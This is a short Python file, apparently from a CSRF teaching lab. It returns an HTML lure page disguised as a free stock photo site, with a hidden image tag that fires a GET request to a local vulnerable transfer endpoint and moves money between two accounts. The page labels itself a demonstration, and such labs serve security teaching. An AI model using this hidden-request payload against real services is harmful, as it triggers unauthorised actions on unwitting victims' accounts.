"""
Attack Scenario: Hidden Image with GET Request
Attack page using hidden image with GET request
"""
def attack_img_get():
    """Attack page using hidden image with GET request"""
    return """
    <h1>Free Stock Photos - Download Now!</h1>
    <p>Check out our amazing collection of free images!</p>
    <img src="https://via.placeholder.com/400x300?text=Free+Image" alt="Free Stock Photo">
    <!-- Hidden malicious image that triggers CSRF attack -->
    <img src="http://localhost:5000/vulnerable/transfer_get?fromid=Arvin&targetid=Channy&money=100" 
         style="display:none;">
    <p><em>This page demonstrates a CSRF attack. The hidden image tag above automatically makes a GET request to transfer money.</em></p>
    """

